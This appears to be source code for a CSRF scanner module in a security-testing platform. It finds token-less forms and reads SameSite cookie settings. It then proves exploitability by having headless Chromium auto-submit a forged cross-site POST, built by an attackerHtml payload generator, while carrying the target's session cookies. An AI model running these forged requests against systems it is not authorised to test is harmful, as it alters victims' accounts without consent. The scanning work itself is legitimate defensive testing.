// CSRF scanner (web2-vuln-classes SKILL — Cross-Site Request Forgery).
//
// EPISTEMIC HONESTY, same contract as xssConfirm.ts: a token-less state-changing
// form is a LEAD, not a proof. Classic CSRF is only exploitable when the browser
// actually attaches the target's session cookie on a CROSS-SITE request AND the
// server accepts the state-changing call without an anti-CSRF defence (token,
// Origin/Referer check, or a SameSite cookie). So this module runs two stages:
//
//   1) STATIC detection (always, anonymous): fetch the root, parse <form> surfaces
//      that mutate state (POST/PUT/PATCH/DELETE) and lack any CSRF-token field or
//      meta tag, and read the baseline Set-Cookie to learn whether the session
//      cookie carries SameSite=Strict/Lax (which materially mitigates classic
//      cross-site POST CSRF). These are recorded as CANDIDATEs only.
//
//   2) REAL PoC (only path to PROVEN): when a TargetCredential WITH cookies is
//      available, we launch a headless Chromium, inject the target session cookie
//      faithfully (reproducing its real SameSite attribute from the baseline
//      Set-Cookie, so the browser's send/don't-send decision mirrors production),
//      host a hidden auto-submitting form on a DIFFERENT origin (an ephemeral
//      127.0.0.1 node:http server), submit it cross-site, and observe the result.
//      We submit the SAME form once WITHOUT the cookie to establish an
//      unauthenticated baseline. PROVEN only when the authenticated cross-site
//      POST succeeded AND the unauthenticated one did not — i.e. the cookie was
//      genuinely carried cross-site and the server accepted the forged request.
//      Any other outcome (SameSite blocked the cookie, server did an Origin/token
//      check, endpoint enforces no auth, budget exhausted) stays a CANDIDATE with
//      the precise reason.
//
// Hard operational constraints (mirroring xssConfirm.ts): launch with --no-sandbox
// + --disable-dev-shm-usage, a FRESH context per use always closed in finally, a
// strict overall budget (~12s), and the whole thing NEVER throws into the hunt —
// any failure degrades to a CANDIDATE carrying the reason. The ephemeral attacker
// server is always torn down in finally. Cookie/token VALUES are NEVER logged or
// placed in any finding's evidence.

import { chromium, type Browser, type BrowserContext, type Page } from "playwright-chromium";
import { createServer, type Server } from "node:http";
import type { AddressInfo } from "node:net";
import { Severity } from "@prisma/client";
import {
  loadTargetCredentials,
  type DecryptedTargetCredential,
} from "@/server/credentials";
import { logLine, recordFinding, type ScanContext } from "./context";
import { probe } from "./http";

/** Overall wall-clock budget for the whole browser-PoC stage, including launch. */
const OVERALL_DEADLINE_MS = 12_000;
/** Max distinct endpoints we will attempt a real browser PoC against. */
const MAX_CSRF_POCS = 3;
/** Per-navigation page-load cap (further clamped by the remaining budget). */
const PAGE_LOAD_TIMEOUT_MS = 8_000;
/** Below this remaining budget there is no point starting another submission. */
const MIN_SUBMIT_BUDGET_MS = 1_500;
/** Max state-changing forms we record statically. */
const MAX_FORMS = 20;

/** Chromium launch args required by the container (see xssConfirm.ts header). */
const LAUNCH_ARGS = ["--no-sandbox", "--disable-dev-shm-usage"] as const;

/** Hidden-input / meta names that indicate an anti-CSRF token is present. */
const CSRF_TOKEN_RE = /csrf|xsrf|_token|authenticity/i;
/** Cookie names that commonly carry a session. */
const SESSION_COOKIE_RE =
  /(^|[_-])(sess|session|sessid|sid|phpsessid|jsessionid|asp\.net_sessionid|auth|token|login)|connect\.sid/i;

type SameSite = "Strict" | "Lax" | "None";

interface ParsedForm {
  /** Upper-cased method (POST/PUT/PATCH/DELETE/GET). */
  method: string;
  /** Resolved absolute action URL on the target host, or null if off-host/invalid. */
  action: string | null;
  /** Raw action attribute, for logging when it did not resolve on-host. */
  rawAction: string;
  /** True when a CSRF-token hidden input OR a csrf meta tag protects the form. */
  hasToken: boolean;
  /** name=value params harvested from the form's inputs (token fields excluded). */
  params: Record<string, string>;
}

interface CookieInfo {
  name: string;
  sameSite?: SameSite;
}

/** Outcome of a cross-site submission observed in the browser. */
interface SubmitOutcome {
  /** Status of the target's direct response to the forged POST, or null if unseen. */
  status: number | null;
  /** True when a 3xx Location pointed at a login/auth page. */
  redirectToLogin: boolean;
}

/** Per-endpoint PoC verdict. */
type PocVerdict =
  | { proven: true; authStatus: number }
  | { proven: false; reason: string };

// ---------------------------------------------------------------------------
// Static parsing helpers
// ---------------------------------------------------------------------------

/** Does the document carry a <meta name="...csrf..."> token tag? */
function hasCsrfMeta(html: string): boolean {
  for (const m of html.matchAll(/<meta\b[^>]*>/gi)) {
    const tag = m[0];
    const nameAttr = /name\s*=\s*["']([^"']+)["']/i.exec(tag);
    if (nameAttr && CSRF_TOKEN_RE.test(nameAttr[1])) return true;
  }
  return false;
}

/** Extract the value of an HTML attribute from an opening tag, or undefined. */
function attr(tag: string, name: string): string | undefined {
  const m = new RegExp(`${name}\\s*=\\s*("([^"]*)"|'([^']*)'|([^\\s>]+))`, "i").exec(tag);
  if (!m) return undefined;
  return m[2] ?? m[3] ?? m[4];
}

/** Harvest name=value from a form body's inputs; returns [params, hasTokenField]. */
function harvestInputs(inner: string): [Record<string, string>, boolean] {
  const params: Record<string, string> = {};
  let hasToken = false;
  const fieldRe = /<(input|textarea|select)\b[^>]*>/gi;
  for (const m of inner.matchAll(fieldRe)) {
    const tag = m[0];
    const name = attr(tag, "name");
    if (!name) continue;
    if (CSRF_TOKEN_RE.test(name)) {
      hasToken = true;
      continue; // never forge the token field into the PoC
    }
    const type = (attr(tag, "type") ?? "").toLowerCase();
    if (type === "submit" || type === "button" || type === "reset" || type === "file") {
      continue;
    }
    // Reuse an existing value when present; otherwise a plausible placeholder.
    params[name] = attr(tag, "value") ?? "csrftest";
  }
  return [params, hasToken];
}

/** Parse every <form> in the document into a ParsedForm. */
function parseForms(html: string, baseUrl: string, host: string): ParsedForm[] {
  const forms: ParsedForm[] = [];
  const metaToken = hasCsrfMeta(html);
  const formRe = /<form\b([^>]*)>([\s\S]*?)<\/form>/gi;
  for (const m of html.matchAll(formRe)) {
    const openAttrs = m[1];
    const inner = m[2];
    const method = (attr(openAttrs, "method") ?? "GET").toUpperCase();
    const rawAction = attr(openAttrs, "action") ?? "";

    let action: string | null = null;
    try {
      const abs = new URL(rawAction || baseUrl, baseUrl);
      if (abs.host === host && /^https?:$/.test(abs.protocol)) {
        action = abs.toString();
      }
    } catch {
      /* unresolvable action — leave null, still record statically */
    }

    const [params, hasFieldToken] = harvestInputs(inner);
    forms.push({
      method,
      action,
      rawAction,
      hasToken: hasFieldToken || metaToken,
      params,
    });
  }
  return forms;
}

/**
 * Best-effort parse of a flattened Set-Cookie header into per-cookie SameSite
 * info. fetch joins multiple Set-Cookie headers with ", " which collides with
 * commas inside Expires dates, so we split only before a `token=` boundary.
 */
function parseSetCookie(raw: string | undefined): CookieInfo[] {
  if (!raw) return [];
  const segments = raw.split(/,(?=\s*[A-Za-z0-9!#$%&'*+.^_`|~-]+\s*=)/);
  const out: CookieInfo[] = [];
  for (const seg of segments) {
    const eq = seg.indexOf("=");
    if (eq <= 0) continue;
    const name = seg.slice(0, eq).trim();
    if (!name) continue;
    const ss = /;\s*samesite\s*=\s*(strict|lax|none)/i.exec(seg);
    let sameSite: SameSite | undefined;
    if (ss) {
      const v = ss[1].toLowerCase();
      sameSite = v === "strict" ? "Strict" : v === "lax" ? "Lax" : "None";
    }
    out.push({ name, sameSite });
  }
  return out;
}

/** Normalized origin+pathname, for matching a navigation response to an endpoint. */
function pathKey(url: string): string {
  try {
    const u = new URL(url);
    return `${u.origin}${u.pathname.replace(/\/+$/, "")}`;
  } catch {
    return url;
  }
}

/** A 200..399 response that is not a redirect bouncing to a login page. */
function isCoherentSuccess(o: SubmitOutcome): boolean {
  if (o.status === null) return false;
  if (o.status < 200 || o.status >= 400) return false;
  if (o.status >= 300 && o.redirectToLogin) return false;
  return true;
}

// ---------------------------------------------------------------------------
// Browser PoC
// ---------------------------------------------------------------------------

/** Build the attacker page: a hidden form that auto-submits cross-site. */
function attackerHtml(action: string, params: Record<string, string>): string {
  const esc = (s: string) =>
    s.replace(/&/g, "&amp;").replace(/"/g, "&quot;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
  const inputs = Object.entries(params)
    .map(([k, v]) => `<input type="hidden" name="${esc(k)}" value="${esc(v)}">`)
    .join("");
  // Always POST: a cross-site HTML form can only forge GET/POST (no custom
  // headers), which is exactly the classic-CSRF threat model.
  return (
    `<!doctype html><html><body>` +
    `<form id="csrfpoc" action="${esc(action)}" method="POST">${inputs}</form>` +
    `<script>document.getElementById('csrfpoc').submit();</script>` +
    `</body></html>`
  );
}

/**
 * Submit the attacker page once and observe the target's direct response. Uses a
 * fresh context (optionally seeded with the target cookies). Never throws.
 */
async function submitOnce(
  browser: Browser,
  attackerUrl: string,
  endpoint: string,
  cookies: DecryptedTargetCredential["cookies"] | undefined,
  sameSiteByName: Map<string, SameSite>,
  baseUrl: string,
  budgetMs: number,
): Promise<SubmitOutcome> {
  let context: BrowserContext | null = null;
  let page: Page | null = null;
  const endpointKey = pathKey(endpoint);
  let outcome: SubmitOutcome = { status: null, redirectToLogin: false };

  try {
    context = await browser.newContext();

    if (cookies) {
      const secure = baseUrl.startsWith("https://");
      // Reproduce each cookie faithfully, including the SameSite the server set,
      // so the browser's cross-site send decision mirrors production.
      const toAdd = Object.entries(cookies).map(([name, value]) => {
        const ss = sameSiteByName.get(name);
        const c: {
          name: string;
          value: string;
          url: string;
          sameSite?: SameSite;
          secure?: boolean;
        } = { name, value, url: baseUrl };
        if (ss) {
          c.sameSite = ss;
          // A SameSite=None cookie is only valid when Secure.
          if (ss === "None") c.secure = secure;
        }
        return c;
      });
      try {
        await context.addCookies(toAdd);
      } catch {
        // SameSite=None over http (or other strictness) can be rejected; retry
        // without the sameSite/secure hints so the cookie is at least present.
        try {
          await context.addCookies(
            Object.entries(cookies).map(([name, value]) => ({ name, value, url: baseUrl })),
          );
        } catch {
          /* give up on cookie seeding; submission still runs (as unauth) */
        }
      }
    }

    page = await context.newPage();

    // Capture the FIRST response whose origin+path matches the target endpoint —
    // that is the forged POST's direct response (a navigation response here).
    page.on("response", (res) => {
      if (outcome.status !== null) return;
      if (pathKey(res.url()) !== endpointKey) return;
      const status = res.status();
      let redirectToLogin = false;
      if (status >= 300 && status < 400) {
        const loc = res.headers()["location"];
        if (loc && /login|signin|sign-in|auth|sso/i.test(loc)) redirectToLogin = true;
      }
      outcome = { status, redirectToLogin };
    });

    const navTimeout = Math.max(500, Math.min(PAGE_LOAD_TIMEOUT_MS, budgetMs));
    try {
      await page.goto(attackerUrl, { waitUntil: "load", timeout: navTimeout });
    } catch {
      /* the cross-site navigation after submit may abort the attacker nav; the
         response listener still captures the target response if it arrived */
    }

    // Give a brief grace window for the submit navigation's response to land.
    if (outcome.status === null) {
      await waitFor(() => outcome.status !== null, Math.max(0, Math.min(1_500, budgetMs - 200)));
    }

    return outcome;
  } catch {
    return outcome;
  } finally {
    if (page) await page.close().catch(() => {});
    if (context) await context.close().catch(() => {});
  }
}

/** Resolve once predicate() is true or timeoutMs elapses. Never rejects. */
function waitFor(predicate: () => boolean, timeoutMs: number): Promise<void> {
  if (predicate() || timeoutMs <= 0) return Promise.resolve();
  return new Promise<void>((resolve) => {
    const interval = setInterval(() => {
      if (predicate()) {
        clearInterval(interval);
        clearTimeout(timer);
        resolve();
      }
    }, 50);
    const timer = setTimeout(() => {
      clearInterval(interval);
      resolve();
    }, timeoutMs);
  });
}

/**
 * Prove or refute one endpoint by forging the POST cross-site twice: once with
 * the session cookie, once without. PROVEN only when the authenticated forgery
 * succeeded and the unauthenticated one did not. Never throws.
 */
async function pocEndpoint(
  browser: Browser,
  serveHtml: (html: string) => void,
  attackerUrl: string,
  form: ParsedForm,
  cookies: NonNullable<DecryptedTargetCredential["cookies"]>,
  sameSiteByName: Map<string, SameSite>,
  baseUrl: string,
  budgetMs: number,
): Promise<PocVerdict> {
  const endpoint = form.action as string; // caller guarantees non-null
  serveHtml(attackerHtml(endpoint, form.params));

  const per = Math.max(MIN_SUBMIT_BUDGET_MS, Math.floor(budgetMs / 2));

  // Authenticated cross-site forgery.
  const auth = await submitOnce(
    browser,
    attackerUrl,
    endpoint,
    cookies,
    sameSiteByName,
    baseUrl,
    per,
  );

  if (auth.status === null) {
    return { proven: false, reason: "could not observe the cross-site POST response within the budget" };
  }
  if (!isCoherentSuccess(auth)) {
    if (auth.status === 401 || auth.status === 403) {
      return {
        proven: false,
        reason: `server rejected the cross-site POST (HTTP ${auth.status}) — likely an Origin/Referer or anti-CSRF-token check`,
      };
    }
    return {
      proven: false,
      reason: `cross-site POST returned HTTP ${auth.status}${auth.redirectToLogin ? " (redirect to login)" : ""} — not a coherent success`,
    };
  }

  // The authenticated forgery succeeded; establish an unauthenticated baseline to
  // prove the session cookie was what made it succeed (else it is just a public /
  // unauthenticated endpoint, which is not CSRF).
  const unauth = await submitOnce(
    browser,
    attackerUrl,
    endpoint,
    undefined,
    sameSiteByName,
    baseUrl,
    per,
  );

  if (unauth.status !== null && isCoherentSuccess(unauth) && unauth.status === auth.status) {
    return {
      proven: false,
      reason:
        `the cross-site POST behaved identically with and without the session cookie ` +
        `(HTTP ${auth.status}) — the cookie was not required (SameSite likely blocked it, ` +
        `or the endpoint enforces no auth), so this is not an exploitable CSRF`,
    };
  }

  return { proven: true, authStatus: auth.status };
}

// ---------------------------------------------------------------------------
// Entry point
// ---------------------------------------------------------------------------

export async function runCsrf(ctx: ScanContext): Promise<void> {
  await logLine(ctx.scanRunId, `[csrf] inspecting state-changing forms on ${ctx.baseUrl}`);

  const host = new URL(ctx.baseUrl).host;

  const root = await probe(ctx.baseUrl, { timeoutMs: 10_000 });
  if (root.error || root.status === 0) {
    await logLine(
      ctx.scanRunId,
      `[csrf] could not fetch ${ctx.baseUrl}: ${root.error ?? "no response"}`,
      "STDERR",
    );
    return;
  }

  const forms = parseForms(root.body, ctx.baseUrl, host).slice(0, MAX_FORMS);
  const cookieInfos = parseSetCookie(root.headers["set-cookie"]);
  const sessionCookies = cookieInfos.filter((c) => SESSION_COOKIE_RE.test(c.name));
  const sameSiteByName = new Map<string, SameSite>();
  for (const c of cookieInfos) if (c.sameSite) sameSiteByName.set(c.name, c.sameSite);

  // A session cookie is "protected" against classic cross-site POST CSRF when it
  // carries SameSite=Strict or Lax.
  const protectedSession = sessionCookies.filter(
    (c) => c.sameSite === "Strict" || c.sameSite === "Lax",
  );
  const sessionObserved = sessionCookies.length > 0;
  const sessionSameSiteProtected = sessionObserved && protectedSession.length === sessionCookies.length;

  // State-changing, token-less forms are the CSRF candidates.
  const stateChanging = forms.filter(
    (f) => f.method === "POST" || f.method === "PUT" || f.method === "PATCH" || f.method === "DELETE",
  );
  const candidates = stateChanging.filter((f) => !f.hasToken);

  await logLine(
    ctx.scanRunId,
    `[csrf] ${forms.length} form(s), ${stateChanging.length} state-changing, ` +
      `${candidates.length} token-less; session cookie observed: ${sessionObserved}` +
      (sessionObserved ? ` (SameSite-protected: ${sessionSameSiteProtected})` : ""),
  );

  if (candidates.length === 0) {
    await logLine(
      ctx.scanRunId,
      "[csrf] no token-less state-changing forms on the root page — nothing to flag",
    );
    return;
  }

  // Dedupe POST endpoints that can actually be forged by a cross-site form, for
  // the real browser PoC (cap MAX_CSRF_POCS).
  const pocForms: ParsedForm[] = [];
  const seenEndpoints = new Set<string>();
  for (const f of candidates) {
    if (f.method !== "POST" || !f.action) continue;
    const key = pathKey(f.action);
    if (seenEndpoints.has(key)) continue;
    seenEndpoints.add(key);
    pocForms.push(f);
    if (pocForms.length >= MAX_CSRF_POCS) break;
  }

  // Load target credentials (never throws into the hunt).
  const creds = await loadTargetCredentials(ctx.targetId).catch(() => []);
  const credWithCookies = creds.find((c) => c.cookies && Object.keys(c.cookies).length > 0);

  // endpoint pathKey -> PROVEN status / CANDIDATE reason, filled by the PoC stage.
  // Local (not module-global) so concurrent scans never cross state.
  const proven = new Map<string, number>();
  const reasons = new Map<string, string>();

  if (credWithCookies && credWithCookies.cookies && pocForms.length > 0) {
    await logLine(
      ctx.scanRunId,
      `[csrf] credential "${credWithCookies.label}" has cookies — attempting real cross-site PoC on ${pocForms.length} endpoint(s)`,
    );
    await runBrowserPocs(
      ctx,
      pocForms,
      credWithCookies.cookies,
      sameSiteByName,
      proven,
      reasons,
    );
  } else if (!credWithCookies) {
    await logLine(
      ctx.scanRunId,
      "[csrf] no target credential with cookies — recording static candidates only (real exploitation untested)",
    );
  }

  // Record findings for every token-less state-changing form.
  for (const f of candidates) {
    const key = f.action ? pathKey(f.action) : null;
    const provenStatus = key ? proven.get(key) : undefined;
    const where = f.action ?? `${f.rawAction || "(no action)"} [off-host or unresolved]`;

    if (provenStatus !== undefined) {
      await recordFinding(ctx, {
        title: `CSRF — forged cross-site ${f.method} accepted (${new URL(f.action as string).pathname})`,
        vulnClass: "CSRF",
        severity: Severity.HIGH,
        confidence: "PROVEN",
        location: f.action ?? undefined,
        description:
          `A headless Chromium on a DIFFERENT origin hosted a hidden auto-submitting form ` +
          `that POSTed to this endpoint. With the target's session cookie seeded into the ` +
          `browser (reproducing its real SameSite attribute), the forged cross-site request ` +
          `was accepted (HTTP ${provenStatus}); the identical request WITHOUT the session ` +
          `cookie was not accepted. This demonstrates the browser carried the session cookie ` +
          `cross-site and the server performed no anti-CSRF defence (no token, no Origin/Referer ` +
          `check, no SameSite restriction) — a real, exploitable CSRF.`,
        evidence:
          `Cross-site auto-submitting form from an attacker-controlled 127.0.0.1 origin; ` +
          `authenticated forgery -> HTTP ${provenStatus}, unauthenticated baseline -> not accepted. ` +
          `(No cookie or token values are recorded.)`,
      });
      continue;
    }

    // CANDIDATE path — assemble the precise reason it is not PROVEN.
    let reason: string;
    if (f.method !== "POST") {
      reason =
        `method ${f.method} cannot be forged by a cross-site HTML form (it needs a ` +
        `CORS-preflighted request, which a cross-site attacker page cannot send) — classic ` +
        `form-CSRF does not apply; confirm whether a CORS/JS path exists`;
    } else if (!f.action) {
      reason = `form action "${f.rawAction}" did not resolve to an on-host endpoint — could not test`;
    } else if (sessionSameSiteProtected) {
      reason =
        `the session cookie is SameSite=${protectedSession.map((c) => c.sameSite).join("/")}, ` +
        `which materially mitigates classic cross-site POST CSRF`;
    } else if (!credWithCookies) {
      reason = "requires a target session cookie to test real exploitation (none configured)";
    } else {
      // A PoC was attempted for this endpoint but did not reach PROVEN.
      reason =
        (key && reasons.get(key)) || "real exploitation attempted but not proven";
    }

    const severity =
      f.method === "POST" && !sessionSameSiteProtected ? Severity.MEDIUM : Severity.INFO;

    await recordFinding(ctx, {
      title: `CSRF candidate — token-less ${f.method} form`,
      vulnClass: "CSRF",
      severity,
      confidence: "CANDIDATE",
      location: f.action ?? undefined,
      description:
        `State-changing ${f.method} form at ${where} has no anti-CSRF token field or ` +
        `csrf meta tag. ${sessionObserved ? "A session cookie was observed on the baseline response. " : "No session cookie was observed on the baseline response. "}` +
        `Not escalated to PROVEN: ${reason}.\n\n` +
        `To confirm manually: host a cross-site auto-submitting form that POSTs to this ` +
        `endpoint from an authenticated browser and verify the state change occurs without ` +
        `a token / Origin check and with the cookie carried cross-site.`,
      evidence: undefined,
    });
  }

  await logLine(ctx.scanRunId, "[csrf] done");
}

/**
 * Drive the headless-Chromium PoCs for the chosen endpoints, bounded by the
 * overall deadline. Fills `proven` with endpoint->status for PROVEN endpoints and
 * records a precise reason for the rest. Launches ONE browser and ONE ephemeral
 * attacker server, both always torn down in finally. NEVER throws.
 */
async function runBrowserPocs(
  ctx: ScanContext,
  pocForms: ParsedForm[],
  cookies: NonNullable<DecryptedTargetCredential["cookies"]>,
  sameSiteByName: Map<string, SameSite>,
  proven: Map<string, number>,
  reasons: Map<string, string>,
): Promise<void> {
  const deadline = Date.now() + OVERALL_DEADLINE_MS;

  let browser: Browser | null = null;
  let server: Server | null = null;
  let currentHtml = "<!doctype html><html><body></body></html>";
  const serveHtml = (html: string) => {
    currentHtml = html;
  };

  try {
    // Ephemeral attacker origin: a tiny server on a random 127.0.0.1 port. This is
    // a DIFFERENT origin from the target, which a genuine cross-site test requires.
    server = createServer((_req, res) => {
      res.writeHead(200, { "content-type": "text/html; charset=utf-8" });
      res.end(currentHtml);
    });
    const port = await new Promise<number>((resolve, reject) => {
      server!.once("error", reject);
      server!.listen(0, "127.0.0.1", () => {
        const addr = server!.address() as AddressInfo | null;
        if (addr && typeof addr === "object") resolve(addr.port);
        else reject(new Error("could not determine ephemeral port"));
      });
    });
    const attackerUrl = `http://127.0.0.1:${port}/`;

    browser = await chromium.launch({ headless: true, args: [...LAUNCH_ARGS] });

    for (const f of pocForms) {
      const key = pathKey(f.action as string);
      const remaining = deadline - Date.now();
      if (remaining < MIN_SUBMIT_BUDGET_MS * 2) {
        reasons.set(key, "budget exhausted before this endpoint could be tested");
        continue;
      }
      const verdict = await pocEndpoint(
        browser,
        serveHtml,
        attackerUrl,
        f,
        cookies,
        sameSiteByName,
        ctx.baseUrl,
        remaining,
      );
      if (verdict.proven) {
        proven.set(key, verdict.authStatus);
        await logLine(
          ctx.scanRunId,
          `[csrf] PROVEN cross-site CSRF on ${new URL(f.action as string).pathname} (HTTP ${verdict.authStatus})`,
        );
      } else {
        reasons.set(key, verdict.reason);
        await logLine(
          ctx.scanRunId,
          `[csrf] not exploitable on ${new URL(f.action as string).pathname}: ${verdict.reason}`,
        );
      }
    }
  } catch (err) {
    await logLine(
      ctx.scanRunId,
      `[csrf] browser PoC stage degraded: ${err instanceof Error ? err.message : String(err)}`,
      "STDERR",
    );
  } finally {
    if (browser) await browser.close().catch(() => {});
    if (server) {
      await new Promise<void>((resolve) => server!.close(() => resolve())).catch(() => {});
    }
  }
}
